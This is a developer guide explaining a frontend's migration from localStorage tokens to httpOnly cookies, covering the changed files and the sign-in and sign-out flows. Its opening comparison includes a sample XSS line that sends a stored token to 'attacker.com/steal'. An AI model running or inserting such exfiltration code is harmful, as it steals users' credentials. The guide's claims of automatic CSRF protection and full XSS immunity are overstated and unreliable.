# Frontend Security Upgrade: localStorage → httpOnly Cookies

## 🎯 What Changed

Your frontend has been upgraded from **localStorage** to **httpOnly cookies** for authentication. This is a **major security improvement**.

---

## 🔒 Security Comparison

### Before (localStorage) ❌

```typescript
// Vulnerable to XSS attacks
localStorage.setItem("token", token)

// Any JavaScript can steal it:
fetch("https://attacker.com/steal", { 
  body: localStorage.getItem("token") 
})
```

**Risks:**
- Any malicious script can read the token
- XSS attacks can steal credentials
- No built-in protection

### After (httpOnly Cookies) ✅

```typescript
// Backend sets cookie - JavaScript CANNOT access it
Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict

// Trying to access it returns undefined
console.log(document.cookie) // token is NOT visible ✅
```

**Benefits:**
- JavaScript cannot access the cookie at all
- XSS attacks cannot steal the token
- Automatic CSRF protection
- Server-side expiration control

---

## 📝 Files That Changed

### 1. **src/hooks/useUser.ts**

**What changed:**
- Removed `localStorage.setItem("token", ...)`
- Added signout endpoint call to clear cookie

**Why:**
```typescript
// BEFORE ❌
localStorage.setItem("token", response.token)

// AFTER ✅
// Backend automatically sets cookie
// We just update the context
login(response.token, response.user)
```

---

### 2. **src/contexts/AuthContext.tsx**

**What changed:**
- Removed all `localStorage` references
- Changed to call API to check if user is authenticated

**Why:**
```typescript
// BEFORE ❌
const token = localStorage.getItem("token")
if (!token) return

// AFTER ✅
// Can't check cookie from JavaScript
// So we call backend to validate
const userData = await UserService.getProfile()
```

---

### 3. **src/lib/services/user.ts**

**What changed:**
- Added `credentials: "include"` to all fetch calls

**Why:**
```typescript
// BEFORE ❌
fetch(url, {
  headers: { Authorization: `Bearer ${token}` }
})

// AFTER ✅
fetch(url, {
  credentials: "include" // Sends cookies automatically
})
```

---

### 4. **src/lib/config/api.ts**

**What changed:**
- Removed `localStorage.getItem("token")` from headers
- Cookies are sent automatically now

**Why:**
```typescript
// BEFORE ❌
const token = localStorage.getItem("token")
headers: { Authorization: `Bearer ${token}` }

// AFTER ✅
// No token needed in headers
// Cookie is sent automatically with credentials: 'include'
```

---

### 5. **src/lib/services/meetup.ts**

**What changed:**
- Added `credentials: "include"` to ALL 8 fetch calls

**Why:**
- Every API call needs to send cookies
- Without this, requests would be unauthenticated

---

### 6. **src/middleware.ts**

**What changed:**
- Re-enabled middleware to check for cookies
- Now looks for `token` cookie instead of localStorage

**Why:**
```typescript
// BEFORE (disabled)
// Can't access localStorage from middleware
return NextResponse.next()

// AFTER (enabled) ✅
const token = request.cookies.get("token")?.value
if (isProtectedRoute && !token) {
  return NextResponse.redirect("/")
}
```

---

## 🔐 How Authentication Works Now

### Sign In Flow:

```
1. User enters email/password
   ↓
2. Frontend sends to: POST /api/user/signin
   ↓
3. Backend validates credentials
   ↓
4. Backend creates JWT token
   ↓
5. Backend sets httpOnly cookie:
   Set-Cookie: token=xyz; HttpOnly; Secure; SameSite=Strict
   ↓
6. Frontend receives user data (NOT token)
   ↓
7. Cookie is automatically saved by browser
   ↓
8. All future requests automatically include cookie ✅
```

### Accessing Protected Routes:

```
1. User navigates to /dashboard
   ↓
2. Middleware checks for cookie
   ↓
3. If cookie exists → allow access
   ↓
4. Page loads and calls API
   ↓
5. Browser automatically sends cookie with request
   ↓
6. Backend verifies cookie
   ↓
7. Data returned ✅
```

### Sign Out Flow:

```
1. User clicks "Logout"
   ↓
2. Frontend calls: POST /api/user/signout
   ↓
3. Backend clears cookie:
   Set-Cookie: token=; expires=Thu, 01 Jan 1970
   ↓
4. Frontend clears local state
   ↓
5. User redirected to homepage ✅
```

---

## 💡 Key Concepts

### What is `credentials: 'include'`?

```typescript
fetch(url, {
  credentials: "include" // ← This is CRITICAL
})
```

**What it does:**
- Tells browser to send cookies with the request
- Tells browser to save cookies from the response
- Without this, cookies won't work!

### Why Can't JavaScript Access httpOnly Cookies?

```typescript
// This returns EMPTY (or doesn't include httpOnly cookies)
console.log(document.cookie) // ""

// This returns undefined
localStorage.getItem("token") // undefined

// But the cookie IS there!
// It's just invisible to JavaScript ✅
```

**This is a FEATURE, not a bug:**
- Prevents XSS attacks from stealing the token
- Only the browser and server can see it
- JavaScript can't read it or delete it

---

## 🧪 How to Verify It's Working

### 1. Check Browser DevTools

**After signing in:**
1. Open DevTools (`F12`)
2. Go to **Application** tab
3. Click **Cookies** → `http://localhost:3000`
4. You should see:
   - Name: `token`
   - Value: (long string)
   - HttpOnly: ✓ (checked)
   - Secure: (depends on HTTPS)
   - SameSite: `Strict`

### 2. Try to Access in Console

```javascript
// Try this in browser console after signing in:
console.log(document.cookie)

// Result: 
// token is NOT visible (it's httpOnly!) ✅
```

### 3. Check Network Tab

**After signing in:**
1. Open DevTools → **Network** tab
2. Click any API request (e.g., `GET /api/user/profile`)
3. Click **Headers** tab
4. Look at **Request Headers**
5. You should see:
   ```
   Cookie: token=eyJhbGc...
   ```

**This proves the cookie is being sent!** ✅

---

## 🚨 Common Issues & Solutions

### Issue: "Not authenticated" even after signing in

**Check:**
1. Did you update the backend? (See `BACKEND_COOKIE_AUTH_GUIDE.md`)
2. Is `credentials: 'include'` in all fetch calls? ✅ (already done)
3. Is CORS configured with `credentials: true`? (backend)

### Issue: Cookies not being saved

**Check:**
1. Backend sends `Set-Cookie` header? (check Network tab)
2. CORS allows credentials? (backend config)
3. Same domain for frontend/backend? (both localhost)

### Issue: Can't see cookie in `document.cookie`

**This is normal!**
- httpOnly cookies are invisible to JavaScript
- Check DevTools → Application → Cookies instead
- This is a security feature, not a bug ✅

---

## 📊 Security Benefits

| Feature | localStorage | httpOnly Cookie |
|---------|--------------|-----------------|
| XSS Protection | ❌ No | ✅ Yes |
| CSRF Protection | ❌ No | ✅ Yes (with SameSite) |
| Automatic Expiration | ❌ Manual | ✅ Built-in |
| HTTPS Enforcement | ❌ No | ✅ Yes (Secure flag) |
| Accessible to JavaScript | ❌ Yes (bad!) | ✅ No (good!) |
| Server-Side Control | ❌ No | ✅ Yes |

---

## 🎓 What You Learned

1. **localStorage is vulnerable** to XSS attacks
2. **httpOnly cookies are secure** because JavaScript can't access them
3. **`credentials: 'include'`** is needed to send/receive cookies
4. **CORS must allow credentials** for cookies to work
5. **Middleware can check cookies** server-side for protection
6. **Backend sets and clears cookies**, not frontend

---

## 🔄 What Happens Next

### When You Implement the Backend:

1. ✅ Install `cookie-parser`
2. ✅ Enable CORS with `credentials: true`
3. ✅ Update sign-in to set httpOnly cookie
4. ✅ Create sign-out endpoint to clear cookie
5. ✅ Update protected routes to read from cookies

**Then everything will work! 🎉**

---

## 📚 Additional Resources

- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP: Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

---

## ✅ Summary

**You made your app more secure!** 🔒

**Before:**
- Token in localStorage
- Vulnerable to XSS
- Manual token management

**After:**
- Token in httpOnly cookie
- Protected from XSS
- Automatic cookie handling
- Server-side expiration
- CSRF protection

**Next Step:** Implement the backend changes (see `BACKEND_COOKIE_AUTH_GUIDE.md`)

Great job prioritizing security! 🎉

